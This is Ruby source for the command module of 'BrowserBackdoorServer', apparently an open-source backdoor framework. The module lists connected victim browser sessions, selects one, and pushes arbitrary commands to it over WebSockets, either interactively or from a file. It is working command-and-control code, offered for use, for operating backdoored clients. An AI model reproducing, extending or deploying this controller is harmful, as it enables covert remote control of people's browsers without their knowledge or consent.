#
# Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
# BrowserBackdoorServer by IMcPwn.
# See the file 'LICENSE' for copying permission
#

require_relative 'printcolor'
require_relative 'websocket'

module Bbs

module Command
    def Command.infoCommand(info_commands, selected, wsList)
        info_commands.each {|_key, cmd|
            begin
                Bbs::WebSocket.sendCommand(cmd, wsList[selected])
            rescue => e
                 puts e.message
                 Bbs::PrintColor.print_error("Error sending command. Selected session may no longer exist.")
                 break
            end
        }
    end

    # TODO: Show which session is selected
    def Command.sessionsCommand(selected, wsList)
        if wsList.length < 1
            puts "No sessions"
            return
        end
        puts "ID: Connection"
        wsList.each_with_index {|val, index|
            puts index.to_s + " : " + val.to_s
        }
    end

    def Command.execCommandLoop(selected, wsList)
        puts "Enter the command to send (exit when done)."
        loop do
            if !validSession?(selected, wsList)
                return
            end
            print "\ncmd ##{selected} > ".colorize(:magenta)
            cmdSend = gets.split.join(' ')
            break if cmdSend == "exit"
            next if cmdSend == "" || cmdSend == nil
            begin
                Bbs::WebSocket.sendCommand(cmdSend, wsList[selected])
            rescue => e
                Bbs::PrintColor.print_error("Error sending command: " + e.message)
            end
        end
    end

    def Command.execCommand(selected, wsList, cmdIn)
        if cmdIn.length < 2
            execCommandLoop(selected, wsList)
        else
            begin
                file = File.open(cmdIn[1], "r")
                cmdSend = file.read
                file.close
            rescue => e
                Bbs::PrintColor.print_error("Error sending command: " + e.message)
                return
            end
            Bbs::WebSocket.sendCommand(cmdSend, wsList[selected])
        end
    end

    def Command.useCommand(wss, cmdIn)
        if cmdIn.length < 2
            Bbs::PrintColor.print_error("Invalid usage. Try help for help.")
            return
        end
        selectIn = cmdIn[1].to_i
        if selectIn > wss.getWsList().length - 1
            Bbs::PrintColor.print_error("Session does not exist.")
            return
        end
        wss.setSelected(selectIn)
        Bbs::PrintColor.print_notice("Selected session is now " + wss.getSelected().to_s + ".")
    end

    def Command.helpCommand(commands)
        commands.each do |key, array|
            print key
            print " --> "
            puts array
            puts
        end
    end

    def Command.getCertCommand()
        if File.file?("getCert.sh")
            # TODO: Let user set location of getCert.sh
            system("../getCert.sh")
        else
            Bbs::PrintColor.print_error("getCert.sh does not exist")
        end
    end
end

end
